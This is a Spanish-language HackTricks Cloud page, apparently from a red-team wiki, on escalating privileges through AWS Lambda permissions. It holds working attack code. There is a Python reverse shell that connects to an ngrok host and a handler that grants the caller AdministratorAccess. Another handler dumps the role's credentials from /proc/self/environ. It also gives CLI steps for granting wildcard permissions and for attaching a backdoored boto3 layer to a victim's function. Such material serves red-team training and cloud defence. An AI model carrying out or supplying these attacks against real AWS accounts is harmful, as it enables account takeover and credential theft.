# AWS - Lambda Privesc

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de github de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## lambda

M谩s informaci贸n sobre lambda en:

{% content-ref url="../../aws-security/aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../../aws-security/aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Los usuarios con los permisos **`iam:PassRole`, `lambda:CreateFunction`, y `lambda:InvokeFunction`** pueden escalar sus privilegios.\
Pueden **crear una nueva funci贸n Lambda y asignarle un rol IAM existente**, otorgando a la funci贸n los permisos asociados con ese rol. El usuario puede entonces **escribir y subir c贸digo a esta funci贸n Lambda (con un rev shell, por ejemplo)**.\
Una vez configurada la funci贸n, el usuario puede **activar su ejecuci贸n** y las acciones previstas invocando la funci贸n Lambda a trav茅s de la API de AWS. Este enfoque permite al usuario realizar tareas indirectamente a trav茅s de la funci贸n Lambda, operando con el nivel de acceso otorgado al rol IAM asociado.\\

Un atacante podr铆a abusar de esto para obtener un **rev shell y robar el token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Podr铆as tambi茅n **abusar de los permisos del rol de lambda** desde la propia funci贸n lambda.\
Si el rol de lambda tuviera suficientes permisos, podr铆as usarlo para otorgarte derechos de administrador:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Tambi茅n es posible filtrar las credenciales del rol de la lambda sin necesidad de una conexi贸n externa. Esto ser铆a 煤til para **Network isolated Lambdas** utilizadas en tareas internas. Si hay grupos de seguridad desconocidos filtrando tus reverse shells, este fragmento de c贸digo te permitir谩 filtrar directamente las credenciales como salida de la lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Impacto Potencial:** Privilegio de escalada directo al rol de servicio lambda arbitrario especificado.

{% hint style="danger" %}
Ten en cuenta que aunque pueda parecer interesante **`lambda:InvokeAsync`** **no** permite por s铆 solo **ejecutar `aws lambda invoke-async`**, tambi茅n necesitas `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Como en el escenario anterior, puedes **otorgarte el permiso `lambda:InvokeFunction`** si tienes el permiso **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Impacto Potencial:** Privilegios escalados directos al rol de servicio lambda arbitrario especificado.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Los usuarios con permisos de **`iam:PassRole`, `lambda:CreateFunction`, y `lambda:CreateEventSourceMapping`** (y potencialmente `dynamodb:PutItem` y `dynamodb:CreateTable`) pueden **escalar privilegios** indirectamente incluso sin `lambda:InvokeFunction`.\
Pueden crear una **funci贸n Lambda con c贸digo malicioso y asignarle un rol IAM existente**.

En lugar de invocar directamente la Lambda, el usuario configura o utiliza una tabla DynamoDB existente, vincul谩ndola a la Lambda a trav茅s de una asignaci贸n de fuente de eventos. Esta configuraci贸n asegura que la funci贸n Lambda se **dispare autom谩ticamente al ingresar un nuevo elemento** en la tabla, ya sea por la acci贸n del usuario u otro proceso, invocando indirectamente la funci贸n Lambda y ejecutando el c贸digo con los permisos del rol IAM pasado.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Si DynamoDB ya est谩 activo en el entorno de AWS, el usuario solo **necesita establecer el mapeo de la fuente de eventos** para la funci贸n Lambda. Sin embargo, si DynamoDB no est谩 en uso, el usuario debe **crear una nueva tabla** con transmisi贸n habilitada:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Ahora es posible **conectar la funci贸n Lambda a la tabla DynamoDB** mediante **la creaci贸n de un mapeo de fuente de eventos**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Con la funci贸n Lambda vinculada al flujo de DynamoDB, el atacante puede **activar indirectamente la Lambda activando el flujo de DynamoDB**. Esto se puede lograr **insertando un 铆tem** en la tabla de DynamoDB:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Impacto Potencial:** Privilegios elevados directos al rol de servicio de lambda especificado.

### `lambda:AddPermission`

Un atacante con este permiso puede **otorgarse a s铆 mismo (u otros) cualquier permiso** (esto genera pol铆ticas basadas en recursos para otorgar acceso al recurso):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Impacto Potencial:** Privilegios elevados directos al rol de servicio lambda utilizado al otorgar permiso para modificar el c贸digo y ejecutarlo.

### `lambda:AddLayerVersionPermission`

Un atacante con este permiso puede **otorgarse a s铆 mismo (o a otros) el permiso `lambda:GetLayerVersion`**. Podr铆a acceder a la capa y buscar vulnerabilidades o informaci贸n sensible.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Impacto Potencial:** Acceso potencial a informaci贸n sensible.

### `lambda:UpdateFunctionCode`

Los usuarios que tienen el permiso **`lambda:UpdateFunctionCode`** tienen el potencial de **modificar el c贸digo de una funci贸n Lambda existente que est谩 vinculada a un rol IAM.**\
El atacante puede **modificar el c贸digo de la lambda para exfiltrar las credenciales IAM**.

Aunque el atacante podr铆a no tener la capacidad directa de invocar la funci贸n, si la funci贸n Lambda ya existe y est谩 operativa, es probable que se active a trav茅s de flujos de trabajo o eventos existentes, facilitando as铆 indirectamente la ejecuci贸n del c贸digo modificado.

{% code overflow="wrap" %}
```bash
# Thezip should contain the lambda code (trick: DOwnload the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Impacto Potencial:** Privilegios elevados directos al rol de servicio de lambda utilizado.

### `lambda:UpdateFunctionConfiguration`

#### Introducci贸n

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) permite incluir **c贸digo** en tu funci贸n lambda pero **almacen谩ndolo por separado**, de modo que el c贸digo de la funci贸n puede mantenerse peque帽o y **varias funciones pueden compartir c贸digo**.

Dentro de lambda puedes verificar las rutas desde donde se carga el c贸digo python con una funci贸n como la siguiente:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Estos son los lugares:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Por ejemplo, la biblioteca boto3 se carga desde `/var/runtime/boto3` (4ta posici贸n).

#### Explotaci贸n

Es posible abusar del permiso `lambda:UpdateFunctionConfiguration` para **agregar una nueva capa** a una funci贸n lambda. Para ejecutar c贸digo arbitrario, esta capa necesita contener alguna **biblioteca que la lambda va a importar.** Si puedes leer el c贸digo de la lambda, podr铆as encontrar esto f谩cilmente, tambi茅n ten en cuenta que podr铆a ser posible que la lambda **ya est茅 usando una capa** y podr铆as **descargar** la capa y **agregar tu c贸digo** all铆.

Por ejemplo, supongamos que la lambda est谩 usando la biblioteca boto3, esto crear谩 una capa local con la 煤ltima versi贸n de la biblioteca:
```
pip3 install -t ./lambda_layer boto3
```
Puedes abrir `./lambda_layer/boto3/__init__.py` y **a帽adir la puerta trasera en el c贸digo global** (una funci贸n para exfiltrar credenciales o obtener una reverse shell, por ejemplo).

Luego, comprime ese directorio `./lambda_layer` y **sube la nueva capa lambda** en tu propia cuenta (o en la de la v铆ctima, pero es posible que no tengas permisos para esto).\
Ten en cuenta que necesitas crear una carpeta python y poner las bibliotecas all铆 para sobrescribir /opt/python/boto3. Adem谩s, la capa debe ser **compatible con la versi贸n de python** utilizada por la lambda y si la subes a tu cuenta, debe estar en la **misma regi贸n:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Ahora, haz que la capa de lambda subida sea **accesible por cualquier cuenta**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
Y adjunta la capa lambda a la funci贸n lambda de la v铆ctima:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
El siguiente paso ser铆a **invocar la funci贸n** nosotros mismos si podemos o esperar a que **se invoque** por medios normales, lo cual es el m茅todo m谩s seguro.

Una **forma m谩s sigilosa de explotar esta vulnerabilidad** se puede encontrar en:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Impacto Potencial:** Privilegios directos al rol de servicio lambda utilizado.

### `?iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Tal vez con esos permisos puedas crear una funci贸n y ejecutarla llamando a la URL... pero no pude encontrar una forma de probarlo, 隆as铆 que av铆same si lo haces!

### Lambda MitM

Algunas lambdas van a **recibir informaci贸n sensible de los usuarios en par谩metros.** Si obtienes RCE en una de ellas, puedes exfiltrar la informaci贸n que otros usuarios est谩n enviando a ella, rev铆salo en:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Referencias

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
Aprende y practica AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Aprende y practica GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya HackTricks</summary>

* Revisa los [**planes de suscripci贸n**](https://github.com/sponsors/carlospolop)!
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
